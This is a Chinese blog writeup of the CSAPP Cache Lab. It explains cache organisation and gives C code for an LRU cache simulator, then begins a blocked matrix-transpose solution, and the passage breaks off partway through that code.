<p>一个line由三部分组成：</p>
<ul>
<li>$B=2^b$个byte用来存缓存下来的内容</li>
<li>$t$个bit用来记录当前line的tag</li>
<li>$1$个bit用来表示当前line是valid的还是invalid的</li>
</ul>
<p>可见，cache能存储内容的量并不等同于实际所占的大小，它的size为$S \times E \times B$ bytes。</p>
<p>cache这样的结构就支持了用一个$m$位的地址去定位访问cache，如图(b)。当已知cache的地址，我们可以尝试从cache里面访问内容，流程如下：</p>
<ol>
<li>通过set index确定所在的set。</li>
<li>找出tag与之相等的line。</li>
<li>断言valid位不为0。</li>
<li>block offset代表starting byte，retrieve从这个byte开始的内容。</li>
</ol>
<p>当一次访问值的操作中恰好可以从cache里面找到而不用下放到访问内存，那么称为一次hit。当在cache里面找不到，称为一次miss。</p>
<p>在cache里面找不到值的miss发生时，这个值会被添加进cache当中，如果必须把某个cache line覆盖掉，那么这个过程称为eviction。</p>
<p>在评估缓存友好度的时候，一般我们看miss rate，miss发生得越多，miss penalty所占总时间就越多，运行速度就较慢。miss penalty的要比hit大两个数量级左右。</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Cache-Lab-Writeup/miss-rate.png">
<p>要做到缓存友好，我们需要贯彻temporal locality（时间局部性）和spatial locality（空间局部性），比如步长为1的访问数组有很强的spatial locality，经常访问一个变量且尽量减少被evict的可能性有较好的temporal locality。</p>
<h2 id="做前必看"><a href="#做前必看" class="headerlink" title="做前必看"></a>做前必看</h2><p>做之前先看看<a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">实验指导</a>，大体思路都在里面。</p>
<p>然后再了解一下<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">blocking</a>的知识，这个方法会在Part B中用到。</p>
<h2 id="Part-A-Building-Cache-Simulator"><a href="#Part-A-Building-Cache-Simulator" class="headerlink" title="Part A: Building Cache Simulator"></a>Part A: Building Cache Simulator</h2><p>Part A比较简单，需要你去模拟一个简化版的cache。</p>
<p>简化版代表不需要考虑b位的储存内容，eviction的策略选择Least Recently Used(LRU)原则，把最不常访问的元素顶替掉。</p>
<p>只需要修改<code>csim.c</code>，最终输出hit、miss跟eviction的次数。</p>
<p>具体思路recitation都有，直接贴代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> verbose; <span class="comment">// 0 means disable, 1 means enable</span></span><br><span class="line"><span class="keyword">int</span> s; <span class="comment">// number of set index bits</span></span><br><span class="line"><span class="keyword">int</span> S; <span class="comment">// number of sets</span></span><br><span class="line"><span class="keyword">int</span> E; <span class="comment">// associativity</span></span><br><span class="line"><span class="keyword">int</span> b; <span class="comment">// number of block bits</span></span><br><span class="line"><span class="keyword">char</span> traceFile[<span class="number">105</span>]; <span class="comment">// name of the `valgrind` trace to replay</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hit, miss, eviction; <span class="comment">// final answers</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsageInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -h: Optional help flag that prints usage info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -v: Optional verbose flag that displays trace info\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -s &lt;s&gt;: Number of set index bits (S = 2s is the number of sets)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -E &lt;E&gt;: Associativity (number of lines per set)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -b &lt;b&gt;: Number of block bits (B = 2b is the block size)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    -t &lt;tracefile&gt;: Name of the valgrind trace to replay\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parseArguments</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                printUsageInfo();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                verbose = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                S = (<span class="number">1</span> &lt;&lt; s);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                <span class="built_in">strncpy</span>(traceFile, optarg, <span class="number">105</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Unknown format. Please make sure it is valid.\n&quot;</span>);</span><br><span class="line">                printUsageInfo();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> valid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125; CacheLine;</span><br><span class="line"></span><br><span class="line">CacheLine **cacheTable;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildCache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// CacheLine **cacheTable;</span></span><br><span class="line">    cacheTable = <span class="built_in">malloc</span>(S * <span class="keyword">sizeof</span>(CacheLine*));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        cacheTable[i] = <span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; ++j) &#123;</span><br><span class="line">            cacheTable[i][j].valid = <span class="number">0</span>;</span><br><span class="line">            cacheTable[i][j].tag = <span class="number">0xffffffff</span>; <span class="comment">// initially an impossible value</span></span><br><span class="line">            cacheTable[i][j].timestamp = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cacheTable[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cacheTable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timeAdvance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cacheTable[i][j].valid) &#123;</span><br><span class="line">                cacheTable[i][j].timestamp++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> s_bits = ((addr &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> t_bits = (addr &gt;&gt; (s + b));</span><br><span class="line">    <span class="comment">// printf(&quot;[debug] t_bits = %u\n&quot;, t_bits);</span></span><br><span class="line">    <span class="comment">// if the corresponding cache can be found</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        CacheLine *cacheLine = &amp;cacheTable[s_bits][i];</span><br><span class="line">        <span class="comment">// printf(&quot;[debug] tag = %u\n&quot;, cacheLine-&gt;tag);</span></span><br><span class="line">        <span class="keyword">if</span> (cacheLine-&gt;tag == t_bits) &#123;</span><br><span class="line">            hit++;</span><br><span class="line">            cacheLine-&gt;timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;hit&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if we can fill the cache into a null cache line</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        CacheLine *cacheLine = &amp;cacheTable[s_bits][i];</span><br><span class="line">        <span class="comment">// printf(&quot;[debug] %u\n&quot;, cacheLine.tag);</span></span><br><span class="line">        <span class="keyword">if</span> (!cacheLine-&gt;valid) &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[debug] fill in invalid\n&quot;);</span></span><br><span class="line">            cacheLine-&gt;valid = <span class="number">1</span>;</span><br><span class="line">            cacheLine-&gt;timestamp = <span class="number">0</span>;</span><br><span class="line">            cacheLine-&gt;tag = t_bits;</span><br><span class="line">            miss++;</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;miss&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// otherwise, find the target to be substituted according to LRU</span></span><br><span class="line">    <span class="comment">// LRU: Least Recently Used, due to the inverse of locality</span></span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>, max_time_interval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> time_diff = cacheTable[s_bits][i].timestamp;</span><br><span class="line">        <span class="keyword">if</span> (time_diff &gt; max_time_interval) &#123;</span><br><span class="line">            max_time_interval = time_diff;</span><br><span class="line">            idx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    eviction++;</span><br><span class="line">    miss++;</span><br><span class="line">    cacheTable[s_bits][idx].tag = t_bits;</span><br><span class="line">    cacheTable[s_bits][idx].timestamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;miss eviction&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span> op, <span class="keyword">unsigned</span> <span class="keyword">int</span> addr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;%c %x,%d &quot;</span>, op, addr, size);</span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: <span class="comment">// load</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: <span class="comment">// store</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="comment">// load + store</span></span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            getCache(addr, size);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>: <span class="comment">// instruction load, ignored</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (verbose) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readTraceFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *file = fopen(traceFile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Exception: cannot find tracefile.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> op;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> addr;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %x,%d&quot;</span>, &amp;op, &amp;addr, &amp;size) != EOF) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;%c %x %u\n&quot;, op, addr, size);</span></span><br><span class="line">        solve(op, addr, size);</span><br><span class="line">        timeAdvance();</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    parseArguments(argc, argv);</span><br><span class="line">    buildCache();</span><br><span class="line">    readTraceFile();</span><br><span class="line">    freeCache();</span><br><span class="line">    printSummary(hit, miss, eviction);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.cn/static/images/CSAPP-Cache-Lab-Writeup/result-a.png">
<h2 id="Part-B-Efficient-Matrix-Transpose"><a href="#Part-B-Efficient-Matrix-Transpose" class="headerlink" title="Part B: Efficient Matrix Transpose"></a>Part B: Efficient Matrix Transpose</h2><p>这个部分是重头戏。这个部分要求你完成一个矩阵转置的函数，需要满足在不同size下miss次数不高于一定次数，即尽可能降低miss rate。</p>
<p>在这一个part中，$s=5, E=1, b=5$，即我们考虑cache是一个包含32个set，每个set存32个byte的direct-mapped cache。</p>
<p>这篇博客写得非常非常详细，可以直接看 <a target="_blank" rel="noopener" href="https://yangtau.me/computer-system/csapp-cache.html">https://yangtau.me/computer-system/csapp-cache.html</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> transpose_submit_desc[] = <span class="string">&quot;Transpose submission&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (M == <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> block_size = <span class="number">8</span>;</span><br><span class="line">        <span class="comment">// 1. normal blocking: 344 misses</span></span><br><span class="line">        <span class="comment">// int i = 0, j = 0, ii, jj, tmp;</span></span><br><span class="line">        <span class="comment">// for (i = 0; i &lt; N; i += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//     for (j = 0; j &lt; M; j += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//         for (ii = i; ii &lt; i + block_size &amp;&amp; ii &lt; N; ++ii) &#123;</span></span><br><span class="line">        <span class="comment">//             for (jj = j; jj &lt; j + block_size &amp;&amp; jj &lt; M; ++jj) &#123;</span></span><br><span class="line">        <span class="comment">//                 tmp = A[ii][jj];</span></span><br><span class="line">        <span class="comment">//                 B[jj][ii] = tmp;</span></span><br><span class="line">        <span class="comment">//             &#125;</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. use local variables: 288 misses</span></span><br><span class="line">        <span class="comment">// int i, j, k, a0, a1, a2, a3, a4, a5, a6, a7;</span></span><br><span class="line">        <span class="comment">// for (i = 0; i &lt; M; i += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//     for (j = 0; j &lt; N; j += block_size) &#123;</span></span><br><span class="line">        <span class="comment">//         for (k = 0; k &lt; block_size; ++k) &#123;</span></span><br><span class="line">        <span class="comment">//             a0 = A[i + k][j + 0];</span></span><br><span class="line">        <span class="comment">//             a1 = A[i + k][j + 1];</span></span><br><span class="line">        <span class="comment">//             a2 = A[i + k][j + 2];</span></span><br><span class="line">        <span class="comment">//             a3 = A[i + k][j + 3];</span></span><br><span class="line">        <span class="comment">//             a4 = A[i + k][j + 4];</span></span><br><span class="line">        <span class="comment">//             a5 = A[i + k][j + 5];</span></span><br><span class="line">        <span class="comment">//             a6 = A[i + k][j + 6];</span></span><br><span class="line">        <span class="comment">//             a7 = A[i + k][j + 7];</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//             B[j + 0][i + k] = a0;</span></span><br><span class="line">        <span class="comment">//             B[j + 1][i + k] = a1;</span></span><br><span class="line">        <span class="comment">//             B[j + 2][i + k] = a2;</span></span><br><span class="line">        <span class="comment">//             B[j + 3][i + k] = a3;</span></span><br><span class="line">        <span class="comment">//             B[j + 4][i + k] = a4;</span></span><br><span class="line">        <span class="comment">//             B[j + 5][i + k] = a5;</span></span><br><span class="line">        <span class="comment">//             B[j + 6][i + k] = a6;</span></span><br><span class="line">        <span class="comment">//             B[j + 7][i + k] = a7;</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. copy then transpose: 260 misses</span></span><br><span class="line">        <span class="keyword">int</span> i, j, ii, jj, a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += block_size) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += block_size) &#123;</span><br><span class="line">                <span class="keyword">for</span> (ii = i, jj = j; ii &lt; i + block_size; ++ii, ++jj) &#123;</span><br><span class="line">                    a0 = A[ii][j + <span class="number">0</span>];</span><br><span class="line">                    a1 = A[ii][j + <span class="number">1</span>];</span><br><span class="line">                    a2 = A[ii][j + <span class="number">2</span>];</span><br><span class="line">                    a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">                    a4 = A[ii][j + <span class="number">4</span>];</span><br><span class="line">                    a5 = A[ii][j + <span class="number">5</span>];</span><br><span class="line">    